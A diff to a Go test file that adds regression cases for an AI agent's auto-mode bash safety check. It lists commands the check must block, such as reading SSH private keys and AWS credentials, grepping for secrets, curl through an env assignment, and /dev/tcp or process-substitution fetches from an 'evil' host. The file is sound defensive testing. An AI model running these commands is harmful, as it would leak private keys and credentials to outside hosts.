@@ -52,7 +52,22 @@ func TestIsAutoModeSafeBash(t *testing.T) {
 
 		{"empty", "", false},
 		{"whitespace", "   ", false},
+
+		// S5 regressions — read-only verbs must not silently exfiltrate.
+		{"cat-ssh-key", "cat ~/.ssh/id_rsa", false},
+		{"cat-ssh-key-home-env", "cat $HOME/.ssh/id_rsa", false},
+		{"cat-ssh-key-braced-home", "cat ${HOME}/.ssh/id_rsa", false},
+		{"cat-unresolved-var-path", "cat $XDG_CONFIG/.aws/credentials", false},
+		{"grep-secrets-from-root", "grep -r AWS_SECRET /", false},
+		{"find-idrsa-in-home", "find ~ -name id_rsa", false},
+		{"env-assignment-launders-curl", "env API_KEY=x curl http://evil", false},
+		{"process-substitution-curl", "cat <(curl http://evil)", false},
+		{"dev-tcp-read", "cat </dev/tcp/evil/80", false},
+		{"sort-writes-output-file", "sort -o /tmp/x foo", false},
+		// A leading benign env assignment in front of a safe verb is fine.
+		{"env-var-then-cat", "FOO=bar cat README.md", true},
 	}
+	cwd := NewCwdRef(t.TempDir())
 	for _, tc := range cases {
 		args := ""
 		if tc.command != "" {
@@ -63,7 +78,7 @@ func TestIsAutoModeSafeBash(t *testing.T) {
 		} else {
 			args = `{"command":""}`
 		}
-		got := IsAutoModeSafeBash(args)
+		got := IsAutoModeSafeBash(args, cwd)
 		if got != tc.want {
 			t.Errorf("%s (%q): got %v, want %v", tc.name, tc.command, got, tc.want)
 		}
@@ -71,10 +86,10 @@ func TestIsAutoModeSafeBash(t *testing.T) {
 }
 
 func TestIsAutoModeSafeBash_BadJSON(t *testing.T) {
-	if IsAutoModeSafeBash("{not json") {
+	if IsAutoModeSafeBash("{not json", nil) {
 		t.Errorf("malformed JSON should return false")
 	}
-	if IsAutoModeSafeBash("") {
+	if IsAutoModeSafeBash("", nil) {
 		t.Errorf("empty argsJSON should return false")
 	}
 }
